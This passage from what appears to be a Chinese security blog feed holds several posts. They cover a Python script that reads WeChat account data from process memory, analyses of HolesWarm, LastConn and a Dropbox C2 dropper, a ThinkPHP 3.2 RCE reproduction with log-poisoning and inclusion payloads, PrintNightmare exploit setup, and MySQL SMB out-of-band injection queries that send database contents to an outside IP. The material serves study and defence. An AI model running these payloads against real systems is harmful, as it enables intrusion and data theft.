ReadProcessMemory(process,wetchatwindlladdress+0x104F560,byref(phome),11,None)    ReadProcessMemory(process,wetchatwindlladdress+0x104F52C,byref(wxname),20,None)    ReadProcessMemory(process,wetchatwindlladdress+0x104F690,byref(wxnumber),20,None)    print(&quot;WX Phome:&quot;+hex(wetchatwindlladdress + 0x104F560),phome.value.decode())    print(&quot;WX Name:&quot;+hex(wetchatwindlladdress+0x104F52C),wxname.value.decode())    wxnumberaddress=wxnumber.value #可以不用转十六进制，直接十进制即可,py转十六进制默认是str类型。。hex函数转后填进地址读不到    ReadProcessMemory(process,wxnumberaddress,byref(number),20,None)    print(&quot;WX Number:&quot;+number.value.decode())    #getmodule_address(handle,&quot;WeChatWin.dll&quot;)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><img src="https://z3.ax1x.com/2021/07/21/WU3PAO.png" alt=""></p><p>踩坑记录：</p><pre><code>* 调用EnumProcess和用Thread32First枚举模块，结果根本不能完全枚举。原本想模仿Process Explorer调用ZwQueryVirtualMemory函数枚举模块，py写起来太麻烦。。算了</code></pre><p>这种方法也可以用来干别</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HolesWarm蠕虫简陋分析</title>
      <link href="/posts/1d42cb0b.html"/>
      <url>/posts/1d42cb0b.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247498990&amp;idx=1&amp;sn=7a5267d7158760ebaa01a2df690c70e1&amp;chksm=ec9f259ddbe8ac8bd58c7457e66fc19f3dbe89c5f9c968270ac45ffcdcf1ad9b9dcfa1944819&amp;mpshare=1&amp;scene=1&amp;srcid=0712At1VR9Ff5MIVXuq74JU5&amp;sharer_sharetime=1626082528152&amp;sharer_shareid=2119bd962d3dda0ad51c960f2c4e01ca#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247498990&amp;idx=1&amp;sn=7a5267d7158760ebaa01a2df690c70e1&amp;chksm=ec9f259ddbe8ac8bd58c7457e66fc19f3dbe89c5f9c968270ac45ffcdcf1ad9b9dcfa1944819&amp;mpshare=1&amp;scene=1&amp;srcid=0712At1VR9Ff5MIVXuq74JU5&amp;sharer_sharetime=1626082528152&amp;sharer_shareid=2119bd962d3dda0ad51c960f2c4e01ca#rd</a><br>PS：大部分二进制文件都是golang写的</p><p>攻击模块配置信息:<a href="http://m.windowsupdatesupport.org/d/windowsupdatev1.json" target="_blank" rel="noopener">http://m.windowsupdatesupport.org/d/windowsupdatev1.json</a><br><img src="https://i.bmp.ovh/imgs/2021/07/d40a5da968266f64.png" alt=""></p><h2 id="download"><a href="#download" class="headerlink" title="download"></a>download</h2><p>download - md5：423d3ade2f14572c5bd5f546973eb493<br>编写语言:VC++<br><img src="https://i.bmp.ovh/imgs/2021/07/853a3fc9e0eaf244.png" alt=""></p><p>如果加载crt运行库失败进入反调试判断<br>这玩意啥事没干，创建UID然后HOOK和设置窗口的<br><img src="https://i.bmp.ovh/imgs/2021/07/f119fe0052fb76b6.png" alt=""></p><p>沙箱全绿，啥危险动作也没有：<a href="https://www.hybrid-analysis.com/sample/a1dfbac053d9f93dc80792388d210a13b2f9fb69c15dacbf59e9043ea4e8afaf/5fff0d7940bcf316d078c719" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/a1dfbac053d9f93dc80792388d210a13b2f9fb69c15dacbf59e9043ea4e8afaf/5fff0d7940bcf316d078c719</a><br>定性为混淆视听用的 (一本正经胡说八道</p><h2 id="dbus和updater-exe"><a href="#dbus和updater-exe" class="headerlink" title="dbus和updater.exe"></a>dbus和updater.exe</h2><p>xmr挖矿<br><img src="https://i.bmp.ovh/imgs/2021/07/143f344b34ab9ea9.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2021/07/2b14c3fc76c5c4b9.png" alt=""></p><h2 id="sshkey-sh"><a href="#sshkey-sh" class="headerlink" title="sshkey.sh"></a>sshkey.sh</h2><p>杀死带有hashvault.pro,nanopool.org,minexmr.com,/boot/efi/,supportxmr.com,xmrpool.net,minergate.com,viaxmr.com,hwlh3wlh44lh,Circle_MI,get.bi-chi.com,hashvault.pro,nanopool.org,/usr/bin/.sshd,/usr/bin/bsd-port,xmr,xig,ddgs,qW3xT,wnTKYg,t00ls.ru,sustes,thisxxs,hashfish,kworkerds关键字的进程<br>从被沦陷的机器里收集ssh私钥、正在连接到当前机器的ssh IP、ssh port、非0.0.0.0和本机的IP、遍历尝试连接执行命令<br><img src="https://i.bmp.ovh/imgs/2021/07/95b307c837970d3b.png" alt=""></p><h2 id="loader-sh"><a href="#loader-sh" class="headerlink" title="loader.sh"></a>loader.sh</h2><p>loader.sh - md5:28d790d6a9172f3c59df117f00af7755<br>删除或杀死带有aegis,hids,cloudwalker,titanagent,edr,aegis,Yun,hids,edr,cloudwalker,titanagent,sgagent,barad_agent,hostguard关键字的进程/进程所在目录,创建.git目录,下载kworkers到.git目录里后台运行，删除带有m.windowsupdatesupport.org关键字的命令历史记录<br><img src="https://i.bmp.ovh/imgs/2021/07/714b29205612fc41.png" alt=""></p><h2 id="hideproc-sh"><a href="#hideproc-sh" class="headerlink" title="hideproc.sh"></a>hideproc.sh</h2><p>hideproc.sh - md5:27b704633d578c44fefffa2e3ac026ae<br>为了隐藏进程，如果当前权限是root权限，检查/etc/ld.so.preload是否存在关键字libc2.28，远程下载processhider.c编译好后移动至/usr/local/lib/<br><img src="https://i.bmp.ovh/imgs/2021/07/242284e33e57d303.png" alt=""></p><p>processhider用的github上开源的<br><a href="https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c</a><br><a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></p><h2 id="loader-ps1"><a href="#loader-ps1" class="headerlink" title="loader.ps1"></a>loader.ps1</h2><p>loader.ps1 - md5:35429fa2dacf4f52188cfd59f994fd91<br>创建.git文件夹,检查当前目录下是否存在.git文件夹。如果存在附加隐藏属性，下载service到.git文件夹。如果当前目录不存在.git文件夹，就在C:\Windows\Temp文件夹，重复上面的步骤<br><img src="https://i.bmp.ovh/imgs/2021/07/413e938baccda7bb.png" alt=""></p><h2 id="service-exe"><a href="#service-exe" class="headerlink" title="service.exe"></a>service.exe</h2><p>service.exe - md5:b5e5cd56703fbda95accbb8528131da4<br>VT：<a href="https://www.virustotal.com/gui/file/a572e2f1acc9151928b0fc0a69e1cc2b18bb8884aaa7fcf4bfff53706ab447d1/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a572e2f1acc9151928b0fc0a69e1cc2b18bb8884aaa7fcf4bfff53706ab447d1/detection</a></p><blockquote><p>释放procedump尝试dump系统lsass.exe进程（procdump.exe -accepteula -ma lsass.exe C:*/1.dmp），再打包上传，其意图为通过dump LSASS进程，窃取内存数据，再结合其它方法（例如Mimikatz）以破解失陷系统的明文密码，以便进一步对失陷网络的其它计算机进行入侵渗透活动。</p></blockquote><p><img src="https://i.bmp.ovh/imgs/2021/07/a0c67f1d34f97330.png" alt=""><br><img src="https://i.loli.net/2021/07/19/4mdgxGX2Yuc9b6r.png" alt=""></p><p>golang开发的<br><img src="https://i.loli.net/2021/07/19/c12ifCtaOjRVqwS.png" alt=""><br>找不到入口点（没见到main_main）<br>只能靠沙盒了</p><h2 id="autoupdate-exe"><a href="#autoupdate-exe" class="headerlink" title="autoupdate.exe"></a>autoupdate.exe</h2><p>autoupdate.exe - md5:93b797b32df3a0f15d1d9c78749aa918<br>加了UPX壳，同样是golang开发的<br><img src="https://i.loli.net/2021/07/19/SU2kBzhCrgMnYuw.png" alt=""><br><img src="https://i.loli.net/2021/07/19/DjU4mYeoWv1F5KA.png" alt=""></p><p>获取远程要攻击的IP段，和本地机器的IP段。进行web漏洞尝试<br><img src="https://i.loli.net/2021/07/19/3EZip2FucfI5dXB.png" alt=""><br><img src="https://i.loli.net/2021/07/19/gd3EPoMnG6pKWhc.png" alt=""></p><p>进行以下exp尝试</p><pre><code>* 用友bsh.servlet.BshServlet 命令执行攻击* 用友GRP-U8注入-命令执行攻击* 泛微OA E-cology Bsh 命令执行攻击* 致远OA htmlofficeservlet任意文件写入攻击* 致远OA-ajax.do文件上传漏洞攻击* 致远OA-fajson漏洞* Docker未授权命令执行攻击* Jenkins 未授权命令执行攻击* Tomcat 爆破攻击* Weblogic RCE远程执行攻击( CVE-2020-14882)* Spring boot actuator RCE* Shiro 反序列化 RCE* Struts2全系列（s008-s057）的漏洞利用攻击</code></pre><p>…….等等<br><img src="https://i.loli.net/2021/07/19/4ZSFob1LsVpYWHz.png" alt=""></p><h2 id="inj-exe"><a href="#inj-exe" class="headerlink" title="inj.exe"></a>inj.exe</h2><p>inj.exe - md5:46171ccf2302e01fa6cb0a97e081a885<br>进程注射器<br><img src="https://i.loli.net/2021/07/19/dME3pztrLhGv1Xb.png" alt=""></p><h2 id="runtime-dll"><a href="#runtime-dll" class="headerlink" title="runtime.dll"></a>runtime.dll</h2><p>runtime.dll - md5:c6cf950a65df9ebfaf78cfa86f6788db<br>对NtQuerySystemInfomation进行hook，最终实现Windows平台下的恶意模块进程的隐藏。<br><img src="https://i.loli.net/2021/07/19/lH6IMhnVkLUpDva.png" alt=""><br><img src="https://i.loli.net/2021/07/19/IyhkzO29oBLTYZ3.png" alt=""></p><p>URL :<a href="http://m.windowsupdatesupport.org" target="_blank" rel="noopener">http://m.windowsupdatesupport.org</a></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ThinkPHP3.2.x RCE漏洞复现</title>
      <link href="/posts/94587123.html"/>
      <url>/posts/94587123.html</url>
      <content type="html"><![CDATA[<p><img src="https://z3.ax1x.com/2021/07/12/WiotOO.jpg" alt=""></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ThinkPHP3.2的远程代码执行漏洞。该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>windows 10phpstudy 5.6Thinkphp 3.2.3完整版</code></pre><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>demo:</p><blockquote><p>demo代码说明：如果需要测试请把demo代码放入对应位置,代码位置：\Application\Home\Controller\IndexController.class.php,因为程序要进入模板渲染方法方法中，所以需要创建对应的模板文件，内容随意，模板文件位置：Application\Home\View\Index (View没有Index文件夹需要自己创建)</p></blockquote><pre><code class="php">&lt;?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller {    public function index($value=&#39;&#39;){        $this-&gt;assign($value);        $this-&gt;display();    }}</code></pre><p>利用步骤：</p><pre><code>1. 创建log2. 包含log</code></pre><p>创建log发送请求 注意，m=后面的code不要url编码，否则包含的时候会失败）</p><pre><code>http://127.0.0.1/index.php?m=--&gt;&lt;?=phpinfo();?&gt;</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/WiTLxP.png" alt=""></p><p>包含log</p><pre><code>http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_07_12.log</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/Wi7eZF.png" alt=""></p><p>Debug开启和关闭的路径不同:</p><pre><code>开启: Application\Runtime\Logs\Common\&lt;log&gt;关闭: Application\Runtime\Logs\Home\&lt;log&gt;</code></pre><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>1.assign函数返回模板变量<br><img src="https://z3.ax1x.com/2021/07/12/Wi7GqO.png" alt=""></p><p>2.到display函数开始解析<br><img src="https://z3.ax1x.com/2021/07/12/Wi7NIH.png" alt=""></p><p>3.到达View.Class.php发现把payload传入到Hook::Listen函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7wRI.png" alt=""></p><p>4.进入循环在将payload传入self::exec函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7rsf.png" alt=""></p><p>5.调用Behavior\ParseTemplateBehavior类 (将log文件写入缓存php)<br><img src="https://z3.ax1x.com/2021/07/12/Wi7fWn.png" alt=""></p><p>6.调用fetch函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7IyV.png" alt=""></p><p>最后load函数加载<br><img src="https://z3.ax1x.com/2021/07/12/Wi77eU.png" alt=""></p><p>(不会描述，原文章描述的很好)</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a><br><a href="https://blog.csdn.net/cvper/article/details/66713909" target="_blank" rel="noopener">https://blog.csdn.net/cvper/article/details/66713909</a></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>某Dropbox c2分析</title>
      <link href="/posts/e5369ead.html"/>
      <url>/posts/e5369ead.html</url>
      <content type="html"><![CDATA[<p>样本地址：<a href="https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/" target="_blank" rel="noopener">https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/</a><br>x86 C++编写<br><img src="https://z3.ax1x.com/2021/07/03/RRQwnA.png" alt=""></p><p>该样本是个释放器，用于释放Dropbox的c2<br><img src="https://z3.ax1x.com/2021/07/03/RRQoNV.png" alt=""></p><p>首先搜索当前进程所在路径下的doc、xls、pdf。后缀文件，这三个后缀文件如果搜索到一个则打开<br><img src="https://z3.ax1x.com/2021/07/03/RRQH9U.png" alt=""></p><p>然后休眠2秒<br><img src="https://z3.ax1x.com/2021/07/03/RR88DH.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRQLjJ.png" alt=""></p><p>在C:\Users\Public释放名为spools.exe，最后执行<br><img src="https://z3.ax1x.com/2021/07/03/RR8aPP.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8d8f.png" alt=""></p><p>火绒剑动态监控：<br><img src="https://z3.ax1x.com/2021/07/03/RR8w28.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8DKg.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8zse.png" alt=""></p><p>Dropbox c2分析<br>沙盒执行：<a href="https://app.any.run/tasks/84bc039c-cefa-4369-b4ba-3ed1a254eb2c" target="_blank" rel="noopener">https://app.any.run/tasks/84bc039c-cefa-4369-b4ba-3ed1a254eb2c</a><br>注册一个窗口类调用sub_404F30函数<br><img src="https://z3.ax1x.com/2021/07/03/RRGFit.png" alt=""></p><p>该函数调用CreateThread创建线程执行<br><img src="https://z3.ax1x.com/2021/07/03/RRt2mF.png" alt=""></p><p>首先检查开机到现在启动的时间，如果该时间小于192000毫秒。则休眠102毫秒<br>然后获取计算机配置构造出要发送的json，进入死循环<br><img src="https://z3.ax1x.com/2021/07/03/RRtWTJ.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRt5f1.png" alt="计算机配置信息收集"></p><p>构造请求的json<br><img src="https://z3.ax1x.com/2021/07/03/RRtTl6.png" alt=""></p><p>v72+GetLocalTime最终拼接出来的json<br><img src="https://z3.ax1x.com/2021/07/03/RRNSpt.png" alt=""></p><p>IE请求构造<br><img src="https://z3.ax1x.com/2021/07/03/RRNF0g.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNn10.png" alt=""></p><p>在dropbox在给定的路径上创建一个文件夹<br><img src="https://z3.ax1x.com/2021/07/03/RRNucV.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNQnU.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNlBF.png" alt=""></p><p>获取远程的文件夹内容，获取后写入到C:\Users\Public\下的一个文件<br><img src="https://z3.ax1x.com/2021/07/03/RRNt91.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNUc6.png" alt=""></p><p>然后下面上传了一个文件，这里没分析出来是上传了什么<br><img src="https://z3.ax1x.com/2021/07/03/RRNoNj.png" alt=""></p><p>最后远程下载要执行的命令写入到txt，执行完成后上传。最后删除下载的文件<br><img src="https://z3.ax1x.com/2021/07/03/RRNHCn.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNXuT.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRUSUJ.png" alt=""></p><p>最后休眠102毫秒<br><img src="https://z3.ax1x.com/2021/07/03/RRUAKK.png" alt=""></p><p>IOC<br>释放器:0ee449ccbe2e7f413be85b627ca198ba<br>spools.exe md5:b6824c8cb1594e48a8f63d25066e1dde</p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2021-1675复现</title>
      <link href="/posts/c257aa46.html"/>
      <url>/posts/c257aa46.html</url>
      <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p>Windows Print Spooler 远程代码执行漏洞<br>CVE-2021-1675<br>安全漏洞<br>发布时间：2021 年 6 月 8 日 最后更新：2021 年 6 月 21 日<br>分配 CNA：<br>微软<br>MITRE CVE-2021-1675<br>CVSS：3.0 7.8 / 6.8</p></blockquote><p>影响范围:Windows Server 2012-Windows Server 2019</p><p>官方链接:<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675</a></p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Windows Server 2019<br>域控版本:Windows Server 2016<br><img src="https://z3.ax1x.com/2021/07/01/RDr0QU.png" alt=""></p><p>需一个普通的域用户<br><img src="https://z3.ax1x.com/2021/07/01/RDrdzT.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目前有的exp一共有两个，一个是py的一个是cpp写的<br><a href="https://github.com/hayasec/PrintNightmare" target="_blank" rel="noopener">https://github.com/hayasec/PrintNightmare</a><br><a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener">https://github.com/cube0x0/CVE-2021-1675</a></p><p>至于第二个py的，我这impacket环境报错<br><img src="https://z3.ax1x.com/2021/07/01/RDraWV.png" alt=""></p><p>第一个PrintNightmare下载下来后需要改两个地方，第112行的驱动路径UNIDRV.DLL，需要手动确定位置<br><img src="https://z3.ax1x.com/2021/07/01/RDrByF.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrDL4.png" alt=""></p><p>搜索有关old关键词的路径，替换为<code>C:\\Windows\\System32\\spool\\drivers\\x64\\%s</code>，一共有3处<br><img src="https://z3.ax1x.com/2021/07/01/RDrseJ.png" alt=""></p><p>msf或cs生成个x64的dll（填的驱动路径是amd64对应64位），丢到smb。smb需要可以匿名访问/或者直接丢虚拟机里本地路径也行<br>执行即可成功上线cs<br><img src="https://z3.ax1x.com/2021/07/01/RDryw9.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrgF1.png" alt=""></p><p>这里还顺便踩了smb的坑，用自带的smb服务，不要用imapcket的smbserver.py。否则会报句柄错误</p>]]></content>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>mysql smb外带注入</title>
      <link href="/posts/af61cc76.html"/>
      <url>/posts/af61cc76.html</url>
      <content type="html"><![CDATA[<p>需求：secure_file_priv为空，目标系统为windows<br>smb设置如下：</p><pre><code>找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：map to guest = Bad User新设置一个smbsmb日志:/var/log/samba</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuE9S.png" alt=""></p><p>smb外带注入与DNS外带注入比较:</p><ol><li>smb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。</li><li>smb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。</li></ol><p>构造sql语句：</p><pre><code>select load_file(concat(&quot;\\\\&lt;IP&gt;\\&quot;,(SQL语句),&quot;\\xxx&quot;))为了方便从log里提取查询的内容，可以构造如下语句select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,database(),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuJc4.png" alt=""></p><p>查询当前数据库里的表</p><pre><code>1. 使用limit2. substring截断</code></pre><p>使用limit请先获取总共的表数</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select count(table_name) from information_schema.tables where table_schema=database()),&quot;]\\1.txt&quot;));</code></pre><p>再用limit逐个查询</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKS8U.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/29/RwKp2F.png" alt=""></p><p>substring截断<br>截断到120字符串即可</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKAV1.png" alt=""></p><p>还有另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破<br><img src="https://z3.ax1x.com/2021/06/29/RwKUxg.png" alt=""></p><p>参考链接:<a href="http://moonslow.com/article/smb_sql_injection" target="_blank" rel="noopener">http://moonslow.com/article/smb_sql_injection</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>LastConn 样本简陋分析</title>
      <link href="/posts/519d2f5e.html"/>
      <url>/posts/519d2f5e.html</url>
      <content type="html"><![CDATA[<h2 id="事件来源"><a href="#事件来源" class="headerlink" title="事件来源"></a>事件来源</h2><p>事件来源：<a href="https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>由.NET开发<br><img src="https://z3.ax1x.com/2021/06/20/Rimgyj.png" alt=""></p><p>使用混淆器混淆过，de4dot 也无法完全反混淆，但它能够清除一些混淆<br>完全混淆：<br><img src="https://z3.ax1x.com/2021/06/20/Rim2Os.png" alt=""></p><p>部分混淆清除后:<br><img src="https://z3.ax1x.com/2021/06/20/RimWmn.png" alt=""></p><p>入口点</p><pre><code class="c#">private static void LsfApkF4M(){            Application.EnableVisualStyles(); //启用视觉样式            if (Program.nigDBMdtyE5deZClpF != null)            {            }            Application.SetCompatibleTextRenderingDefault(false); //在应用程序范围内设置控件显示文本的默认方式(true使用GDI+方式显示文本|false使用GDI方式显示文本.)            if (Program.V9yJ8yp9ahRYqnZDsG())  //Program.nigDBMdtyE5deZClpF == null            {                w4X4wl9MxwlqqYZEne.cBFhC9cq2dv3Z();                if (Program.nigDBMdtyE5deZClpF == null)                {                    Application.Run(new Form1());                }            }}</code></pre><p>进入到cBFhC9cq2dv3Z函数（判断当前时间减去 2021/6/16/时间戳判断是否大于14天）<br><img src="https://z3.ax1x.com/2021/06/20/Rim5kV.png" alt=""></p><p>大于或等于14天，在 2021-06-16 之后 14 天不能运行，过了这一步检测。进入Form1函数<br><img src="https://z3.ax1x.com/2021/06/20/RimIYT.png" alt=""></p><p>获取主机名+当前用户名<br><img src="https://z3.ax1x.com/2021/06/20/RimofU.png" alt=""></p><p>用户路径的临时文件夹路径获取<br><img src="https://z3.ax1x.com/2021/06/20/Rim7pF.png" alt=""></p><p>检查是否有域的存在<br><img src="https://z3.ax1x.com/2021/06/20/RimHl4.png" alt=""></p><p>获取系统制造商名称<br><img src="https://z3.ax1x.com/2021/06/20/Rimb6J.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimqX9.png" alt=""></p><p>解密资源文件里无名的资源<br><img src="https://z3.ax1x.com/2021/06/20/RimOmR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimX01.png" alt=""></p><p>经过解密得到的为一份配置文件<br><img src="https://z3.ax1x.com/2021/06/20/RimztK.png" alt=""></p><pre><code>txt_Totime=60 //超时时间@txt_Ftime=50@txt_FristTimeConn=45@txt_PathDir=C:\Users\Public\Downloads //下载存放路径@txt_PassRar=1D1VQB4G8Q //压缩包解压密码@txt_Mutex=NVQAGGMV22CY37LNUO9T5CZVS@txt_KeyPath=SOFTWARE\Box@txt_LastConn=LastConn.txt@txt_ShellCode=ShellCode.txt@txt_ListFile=ListFile.txt@txt_isdownload=isdownload.txt@txt_FileToDown=FileToDown.txt@txt_TokenRunOne=O1P6jtSegunFJIAAAAAAAAAAS-BcSjDEdrK0SsV7BAHes97oBWke06Lhg8ThncuyCCy@txt_FileName=Viewfile //下载的压缩包名@txt_MyToken=O1PWT9LGL1As7EAAAAAAAAAAe6Oc-OILc7Y0SU9OIAFll1nElPBz_uE467zscqimYfd@txt_FileOpen=news.doc //诱饵文档@txt_Setting=Setting</code></pre><p>打开注册表路径HKEY_CURRENT_USER\SOFTWARE\Box，如果不存在则创建。然后从该路径读取名为OneFile的键值名称，如果不存在会退出进程，存在则进入到yExgOgDEb函数调用<br><img src="https://z3.ax1x.com/2021/06/20/Rin9pD.png" alt=""></p><p>先返回系统的语言<br><img src="https://z3.ax1x.com/2021/06/20/RinC1e.png" alt=""></p><p>返回系统版本信息<br><img src="https://z3.ax1x.com/2021/06/20/RinP6H.png" alt=""></p><p>返回一系列信息，然后上传到远端，利用Dropbox API 下载Viewfile.rar<br>利用rar命令行解压压缩包<br><img src="https://z3.ax1x.com/2021/06/20/RiniXd.png" alt=""></p><p>根据原文的报告，会从此处下载<br><img src="https://z3.ax1x.com/2021/06/20/RinA0I.png" alt=""></p><blockquote><p>第四个也是最后一个能力是命令处理。“txt_FileToDown”文件是使用“txt_Setting”文件中收到的身份验证令牌从 Dropbox 下载的。如果有任何命令要执行，该文件将包含换行符分隔的“<command>=<command arguments="">”条目。命令包括：<br>DFileDrop – 下载并执行托管在恶意软件 Dropbox 上的文件<br>DFromUrl – 下载并执行托管在 URL 上的文件<br>Cmd – 执行 cmd.exe 命令并通过“txt_ShellCode”文件将结果发送回恶意软件的 Dropbox<br>Powershell – 类似于“Cmd”，但适用于 Powershell<br>WMIC - 类似于“Cmd”，但用于 WMIC<br>ListFile – 获取指定的文件列表并将结果通过“txt_ListFile”文件发送回恶意软件的 Dropbox<br>UploadFiles – 在恶意软件的 Dropbox 上创建文件夹并将指定的文件上传到其中<br>屏幕截图 – 截取屏幕截图并上传到恶意软件的 Dropbox<br>GetIP – 通过 hxxps://api.ipify.org 获取 IP 地址并上传到恶意软件的 Dropbox<br>执行命令后，其条目将从“txt_FileToDown”文件中删除，并将该文件重新上传到恶意软件的 Dropbox。   </p></blockquote><p>该杨本所有混淆字符串解密：<a href="https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt" target="_blank" rel="noopener">https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt</a><br>沙盒链接：<a href="https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>混淆的cs，配合Dropbox做c2是个不错的选择</p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vulnhub ARAGOG</title>
      <link href="/posts/21b3e8d6.html"/>
      <url>/posts/21b3e8d6.html</url>
